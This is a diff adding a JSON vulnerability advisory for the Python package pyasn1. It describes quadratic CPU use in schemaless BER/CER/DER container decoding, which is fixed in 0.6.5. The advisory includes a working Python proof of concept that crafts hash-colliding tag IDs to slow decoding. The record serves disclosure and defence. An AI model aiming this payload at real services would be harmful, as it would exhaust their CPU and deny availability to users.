@@ -1,0 +1,62 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-10-30T23:03:39Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "pyasn1"
+  },
+  "Advisory": {
+    "DatabaseId": 525003,
+    "Id": "GSA_kwCzR0hTQS1mbTljLTVyY2YtMnE1cM4ACALL",
+    "GhsaId": "GHSA-fm9c-5rcf-2q5p",
+    "References": [
+      {
+        "Url": "https://github.com/pyasn1/pyasn1/security/advisories/GHSA-fm9c-5rcf-2q5p"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-119194"
+      },
+      {
+        "Url": "https://github.com/pyasn1/pyasn1/pull/132"
+      },
+      {
+        "Url": "https://github.com/pyasn1/pyasn1/commit/a36e3a3d067148d26197a6b7221fd0e2cde9cc86"
+      },
+      {
+        "Url": "https://github.com/pyasn1/pyasn1/releases/tag/v0.6.5"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-fm9c-5rcf-2q5p"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-fm9c-5rcf-2q5p"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-119194"
+      }
+    ],
+    "Description": "### Summary\n\nWhen an application decodes attacker-controlled BER, CER, or DER data without an ASN.1 schema, a container with many distinct long tag IDs can cause quadratic CPU use. Repeated inputs can exhaust CPU and reduce service availability.\n\n### Details\n\nConstructedPayloadDecoderBase._decodeComponentsSchemaless inserts every decoded component’s TagSet into a growing set, although it only needs to distinguish one tag set from two or more. Attacker-chosen tag IDs can have colliding TagSet hashes, making each later insertion compare against an increasing number of earlier tags. This path is present in v0.6.4 and is inherited by the CER and DER decoders. The proposed fix stops growing the classification set after it contains two distinct tag sets, while retaining every decoded component and its order.  On v0.6.4 with CPython 3.12.10, increasing the collision input from 3,200 to 6,400 components raised decode CPU time from 0.438 to 1.747 seconds; a comparable control rose from 0.031 to 0.065 seconds. Both inputs decoded successfully with the expected values and an empty remainder.\n\n### Proof of concept\n\nRun this outside the repository checkout in a fresh Python 3.12 environment with pyasn1==0.6.4 installed:\n\n```python\nimport sys\nimport time\n\nfrom pyasn1.codec.ber import decoder\nfrom pyasn1.type import univ\n\n\ndef enc_tag(tag_id):\n    groups = [tag_id \u0026 0x7f]\n    tag_id \u003e\u003e= 7\n    while tag_id:\n        groups.append((tag_id \u0026 0x7f) | 0x80)\n        tag_id \u003e\u003e= 7\n    return b'\\xbf' + bytes(reversed(groups))\n\n\ndef payload(tag_ids):\n    body = b''.join(enc_tag(tag_id) + b'\\x03\\x04\\x01A'\n                    for tag_id in tag_ids)\n    length = len(body).to_bytes((len(body).bit_length() + 7) // 8, 'big')\n    return b'\\x30' + bytes([0x80 | len(length)]) + length + body\n\n\nfor count in (3200, 6400):\n    cases = (\n        (\"collision\", [32 + i * sys.hash_info.modulus\n                       for i in range(count)]),\n        (\"control\", [(1 \u003c\u003c 70) + i for i in range(count)]),\n    )\n    for name, tag_ids in cases:\n        wire = payload(tag_ids)\n        start = time.process_time()\n        value, remainder = decoder.decode(wire)\n        cpu_seconds = time.process_time() - start\n\n        assert type(value) is univ.Sequence\n        assert len(value) == count and remainder == b''\n        for position, tag_id in enumerate(tag_ids):\n            component = value.getComponentByPosition(position)\n            assert component.asOctets() == b'A'\n            assert component.tagSet[-1].tagId == tag_id\n\n        print(count, name, len(wire), round(cpu_seconds, 3))\n```\n\n### Impact\n\nApplications that pass attacker-controlled bytes to schemaless BER, CER, or DER decoding can spend disproportionate CPU time on a relatively small, valid input. The demonstrated impact is availability; no confidentiality or integrity impact was observed.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-30T23:03:37Z",
+    "Severity": "HIGH",
+    "Summary": "pyasn1 has quadratic CPU use in schemaless BER/CER/DER container decoding",
+    "UpdatedAt": "2026-10-30T23:03:39Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.5,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.6.5"
+      },
+      "VulnerableVersionRange": "\u003e= 0.3.3, \u003c 0.6.5"
+    }
+  ]
+}
